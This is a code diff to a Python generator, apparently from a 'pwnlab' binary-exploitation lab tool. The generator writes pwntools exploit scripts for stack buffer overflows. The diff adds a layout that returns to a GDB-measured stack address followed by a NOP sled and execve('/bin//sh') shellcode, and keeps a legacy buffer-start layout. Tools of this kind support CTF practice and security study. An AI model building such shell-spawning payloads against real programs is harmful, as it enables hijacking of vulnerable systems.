@@ -91,16 +91,10 @@ def _shellcode(s: Strategy, cfg: Config) -> str:
         proc = f"p = process({cmd}, env={env_dict}, stdin=PTY)\n"
 
     esp_val = s.addresses.get("esp_at_overflow")
-    addr_line = (
-        f"BUF_START = {hex(esp_val)}"
-        if esp_val
-        else "BUF_START = 0xDEADBEEF  # TODO: replace with actual buffer address (run 'pwnlab auto')"
-    )
+    post_eip = any("post-EIP" in n for n in s.notes)
 
     if cfg.target.arch == "i386":
         shellcode_block = (
-            "# 24-byte execve('/bin//sh') — placed at offset 0 so the binary's own\n"
-            "# stack writes (counter variables etc.) only hit the safe filler region.\n"
             "shellcode = asm('''\n"
             "    xor eax, eax\n"
             "    push eax\n"
@@ -114,12 +108,31 @@ def _shellcode(s: Strategy, cfg: Config) -> str:
             "    mov al, 0xb\n"
             "    int 0x80\n"
             "''')\n"
-            "filler = asm('nop') * (OFFSET - len(shellcode))\n\n"
         )
-        payload_line = "payload = shellcode + filler + p32(BUF_START)\n\n"
     else:
         shellcode_block = "shellcode = asm(shellcraft.sh())\n"
-        payload_line = "payload = shellcode + b'\\x90' * (OFFSET - len(shellcode)) + p64(BUF_START)\n\n"
+
+    if post_eip and esp_val:
+        # Post-EIP layout: padding fills the buffer, then we return to ESP-after-ret
+        # (measured by GDB) where a small NOP sled + shellcode land.
+        # No buffer-start guessing needed — works regardless of environment.
+        addr_line = f"ESP_AT_RET = {hex(esp_val)}  # ESP measured by GDB after ret"
+        if cfg.target.arch == "i386":
+            payload_line = "payload = b'A' * OFFSET + p32(ESP_AT_RET) + b'\\x90' * 16 + shellcode\n\n"
+        else:
+            payload_line = "payload = b'A' * OFFSET + p64(ESP_AT_RET) + b'\\x90' * 16 + shellcode\n\n"
+    else:
+        # Legacy layout: shellcode at offset 0, return address points to buffer start.
+        addr_line = (
+            f"BUF_START = {hex(esp_val)}"
+            if esp_val
+            else "BUF_START = 0xDEADBEEF  # TODO: replace with actual buffer address (run 'pwnlab auto')"
+        )
+        if cfg.target.arch == "i386":
+            shellcode_block += "filler = asm('nop') * (OFFSET - len(shellcode))\n"
+            payload_line = "payload = shellcode + filler + p32(BUF_START)\n\n"
+        else:
+            payload_line = "payload = shellcode + b'\\x90' * (OFFSET - len(shellcode)) + p64(BUF_START)\n\n"
 
     return (
         _header("shellcode", s.binary, s.notes, s.todos)
@@ -127,7 +140,7 @@ def _shellcode(s: Strategy, cfg: Config) -> str:
         + f"BINARY = \"{s.binary}\"\n"
         + f"OFFSET = {offset}\n"
         + _input_file_decl(s)
-        + shellcode_block
+        + shellcode_block + "\n"
         + f"{addr_line}\n\n"
         + payload_line
         + write
